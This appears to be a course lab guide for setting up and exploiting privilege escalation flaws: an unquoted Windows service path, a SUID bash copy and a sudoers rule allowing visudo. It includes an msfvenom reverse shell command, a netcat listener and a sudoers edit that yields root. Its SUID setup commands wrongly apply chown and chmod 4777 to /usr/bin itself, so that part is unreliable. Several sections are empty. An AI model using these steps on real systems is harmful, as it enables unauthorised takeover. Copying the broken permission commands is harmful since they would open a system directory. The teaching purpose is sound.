# Security First Principles: Least Privilege Labs
Created for DSU's Cyber Operations I course

| Box Name | Type |
| -------- | ------- |
| Linux Exercises | Kali 2023.3 |
| Windows Exercises | Windows 10 Pro build 19044 |
* Windows Defender is disabled via Group Policy on the Windows Exercises box.

## Lab Exercise 1: Widnows Horizontal/Vertical PrivEsc
### Configuration
#### Horizontal PrivEsc via Unquoted Service Path
1. Add two additional standard users the box, with different passwords. Use the only one of the users for the following steps.
2. Create a "Step 4" folder on the desktop of the selected user.
3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
     * Ensure the `Level 2 Name` contains a space (ex. `Automated Service`)
     * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
5. Edit the `Level 1 Name` folder properties to grant all users write permission (Properties > Security > Users > Edit > Write).
6. Create a new registry key in `HKLM\SYSTEM\CurrentControlSet\Services`. This key will be the service name.
7. Add the following values to the key:

    | Name | Type | Data |
    | -------- | ------- | ------- |
    | (Default) | REG_SZ | (value not set) |
    | DisplayName | REG_SZ | [Service Name] |
    | ErrorControl | REG_DWORD | 0x00000001 (1) |
    | ImagePath | REG_EXPAND_SZ | [Path to Dummy Service Executable **without quotes**] |
    | ObjectName | REG_SZ | .\\[User Name] |
    | Start | REG_DWORD | 0x00000002 (2) |
    | Type | REG_DWORD | 0x00000010 (16) |

8. Restart the box.
9. Open the Services MMC snap-in. The `[Service Name]` should appear in the list. Ensure the startup type is set to Automatic so it executes when the box starts.

#### Vertical PrivEsc

### Exploitation
#### Horizontal PrivEsc via Unquoted Service Path
1. Log on to the second user created in Configuration step 1.
2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
      * In the example above, this would be `Automated.exe`.
      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Automated.exe` in the Windows PrivEsc archive in the repo.
          * Password: `infected`

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
```

2. SCP the generated file from the LInux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.

#### Vertical PrivEsc

## Lab Exercise 2: Linux Horziontal PrivEsc via SUID
### Configuration
1. Add two additional users the box, with different passwords. These users should not be able to use `sudo`. Use the only one of the users for the following steps.
2. Create a "Step 4" folder on the desktop of the first user.
3. Build the modified Bash shell in the Linux PrivEsc/Lab 2 folder in the repo with `./configure` and `make`. Name it `shell`.
      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be [ignored by default](https://www.gnu.org/software/bash/manual/bash.html)).
      * A pre-built `shell` for the Linux Exercises box is also in the folder.
4. Place the `shell` in the `/usr/bin` folder.
5. Set the owner and group (if applicable) and the SUID bit on the file:
      * If set correctly, permissions should be `-rwSrwxrwx` and the user and group will be the first user.

```
chown [first user] /usr/bin
chgrp [first user] /usr/bin
chmod 4777 /usr/bin
chmod u-x /usr/bin
```

### Exploitation
1. Log on to the second user created in Configuration step 1.
2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.

## Lab Exercise 3: Linux Vertical PrivEsc via visudo
### Configuration
1. Using `sudo` as the first user, create a "Step 5" folder in the home directory of the root user.
2. Use `visudo` to edit the `/etc/sudoers` file. Add a line for your second user to allow them to run `visudo` beneath the root user:
      * A preconfigured `/etc/sudoers` file is `sudoers.old` in the Linux PrivEsc/Lab 3 folder in the repo as well.

```
# User privilege specification
root	ALL=(ALL:ALL) ALL
[second user name]	ALL=/usr/sbin/visudo
```

3. Save the file

### Exploitation
1. Run `visudo` as the second user.
2. Append `,/usr/bin/su` to the privilege specifcation for the second user:

```
# User privilege specification
root	ALL=(ALL:ALL) ALL
[second user name]	ALL=/usr/sbin/visudo,/usr/bin/su
```

3. Save the file
4. Run `sudo su` as the second user. A root shell will spawn.

## Puzzler: Correcting PrivEsc Vulnerabilities
